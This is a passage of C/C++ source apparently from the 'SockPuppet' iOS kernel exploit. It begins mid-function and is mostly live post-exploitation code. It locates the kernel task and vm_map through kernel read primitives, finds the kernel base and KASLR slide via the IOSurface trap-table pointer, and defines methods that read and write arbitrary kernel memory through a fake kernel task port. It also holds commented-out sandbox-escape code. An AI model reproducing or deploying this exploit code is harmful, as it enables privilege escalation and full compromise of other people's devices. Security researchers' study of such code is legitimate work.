    printf("setuid: %d, uid: %d\n", setuid(orig_uid), getuid());
    if (getuid() != orig_uid)
    {
        printf("failed to de-elevate to uid: %d\n", orig_uid);
        elevateRet = KERN_FAILURE;
        //goto out;
    }
     */

    /* unsandbox
    uint64_t cr_label_s3 = rk64SP(orig_ucred_s3 + 0x78);
    wk64SP(cr_label_s3 + 0x10, 0);
    
    if (elevateRet != KERN_SUCCESS ||
        !MACH_PORT_VALID(hsp4))
    {
        printf("failed to set hsp4! error: %x %s, port: %x\n", elevateRet, mach_error_string(elevateRet), hsp4);
        //goto out;
    }
    
    
    */
    
    
    
    
    
    
    
    
    
    
    
    
    
    uint64_t kerntaskFinal = 0x0;
    kerntaskFinal = rk64SP(kernprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_TASK));
    if (kerntaskFinal == 0x0)
    {
        printf("failed to find kerntask!\n");
    }
    printf("[*] got kerntask: 0x%llx\n", kerntaskFinal);
    uint64_t checkkerntaskFinal = 0x0;
    checkkerntaskFinal = rk64SP(kerntaskFinal + koffsetS3(KSTRUCT_OFFSET_TASK_BSD_INFO));
    if (checkkerntaskFinal == 0x0)
    {
        printf("failed to find kerntask!\n");
    }
    printf("[*] got checkkerntaskFinal: 0x%llx\n", checkkerntaskFinal);
    newClientSP_s3 = client;
    printf("[*] newClientSP = 0x%x\n", newClientSP_s3);
    int myPidQ = getpid();
    uint64_t kernel_vm_mapFinal = 0x0;
    kernel_vm_mapFinal = rk64SP(kerntaskFinal + koffsetS3(KSTRUCT_OFFSET_TASK_VM_MAP));
    if (kernel_vm_mapFinal == 0x0)
    {
        printf("failed to find kernel_vm_map!\n");
    }
    printf("[*] got kernel vm map: 0x%llx\n", kernel_vm_mapFinal);
    uint64_t ipc_space_kernelFinal = 0x0;
    ipc_space_kernelFinal = SP_task_ipc_spaceKERNEL_SP_s3;//rk64_check(self_port_addr_SP + SPkoffset(SPKSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    printf("[*] ipc_space_kernel: 0x%llx\n", ipc_space_kernelFinal);
    uint64_t get_trap_for_index_addr = 0x0;
    get_trap_for_index_addr = rk64SP(iosruc_vtab + (koffsetS3(KSTRUCT_OFFSET_GET_TRAP_FOR_INDEX) * 0x8));
    if (get_trap_for_index_addr == 0x0)
    {
        printf("failed to get IOSurface::getExternalTrapForIndex func ptr!\n");
        //
    }
    printf("get_trap_for_index_addr: 0x%llx\n", get_trap_for_index_addr);
    #define kernel_image_base           0xfffffff007004000
    #define KERNEL_HEADER_OFFSET        0x4000
    #define KERNEL_SLIDE_STEP           0x10000   //#define MAX_KASLR_SLIDE 0x21000000 // 0x200000 / 0x100000
    #define KERNEL_MAGIC MH_MAGIC_64
    uint64_t kernel_base = (get_trap_for_index_addr & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;//find_kernel_base();//
    printf("kernel_base: 0x%llx\n", kernel_base);
    do
    {
        uint32_t kbase_value = 0x0;
        kbase_value = rk32SP(kernel_base);
        if (kbase_value == MH_MAGIC_64){
            printf("[*] REAL found kernel_base: 0x%llx\n", kernel_base);
            //sleep(1);
            break;
        }
        kernel_base -= 0x1000;
    } while (true);
    uint64_t kernel_slide = (kernel_base - kernel_image_base);
    printf("[*] REAL kernel slide: 0x%llx\n", kernel_slide);
    printf("[*] REAL kernel base: 0x%llx\n", kernel_base);
    basefromkernelmemory = kernel_base;
    printf("[*] kernel_slide_EXPORTED_SP: 0x%llx\n", kernel_slide);
    slidefromkernelmemory = kernel_slide;
    printf("[*] slidefromkernelmemory: 0x%llx\n", slidefromkernelmemory);

    printf("[*] kernel_base_EXPORTED_SP: 0x%llx\n", basefromkernelmemory);
    newClientSP_s3 = client;
    printf("[*] newClientSP   = 0x%x\n",newClientSP_s3);
    printf("[*] new_SP_task_port_kaddr  = 0x%llx\n",new_SP_task_port_kaddr_s3);
    
    return true;
}

size_t SockPuppet::readKernelMemory(uint64_t address, uint8_t *buffer,
                                    size_t bufferSize) {
    mach_vm_size_t numRead;
    const kern_return_t didRead = mach_vm_read_overwrite(
                                                         kernelTaskPort, address, bufferSize, (vm_address_t)buffer, &numRead);
    if (didRead != KERN_SUCCESS)
        throw std::runtime_error("Failed to read kernel memory");

    return numRead;
}

size_t SockPuppet::writeKernelMemory(uint64_t address, uint8_t *data,
                                     size_t dataSize) {
    auto const toWrite = static_cast<mach_msg_type_number_t>(dataSize);
    const kern_return_t didWrite =
    mach_vm_write(kernelTaskPort, address, (vm_offset_t)data, toWrite);
    if (didWrite != KERN_SUCCESS)
        throw std::runtime_error("Failed to write kernel memory");

    return toWrite;
}

mach_port_t SockPuppet::getFakeKernelTaskPort() { return kernelTaskPort; }

uint64_t SockPuppet::getCurrentTaskAddress() { return currentTaskAddr; }

void info(const char *format, ...) {
    va_list arglist;
    va_start(arglist, format);
    size_t formatLength = strlen(format);
    char *formatNewLine = (char *)malloc(formatLength + sizeof('\n') + sizeof('\0'));
    memcpy((void *)formatNewLine, (void *)format, formatLength);
    formatNewLine[formatLength] = '\n';
    formatNewLine[formatLength + 1] = '\0';
    vprintf(formatNewLine, arglist);
    free(formatNewLine);
    va_end(arglist);
}

void debug(const char *format, ...) {
    va_list arglist;
    va_start(arglist, format);
    size_t formatLength = strlen(format);
    char *formatNewLine = (char *)malloc(formatLength + sizeof('\n') + sizeof('\0'));
    memcpy((void *)formatNewLine, (void *)format, formatLength);
    formatNewLine[formatLength] = '\n';
    formatNewLine[formatLength + 1] = '\0';
    vprintf(formatNewLine, arglist);
    free(formatNewLine);
    va_end(arglist);
}
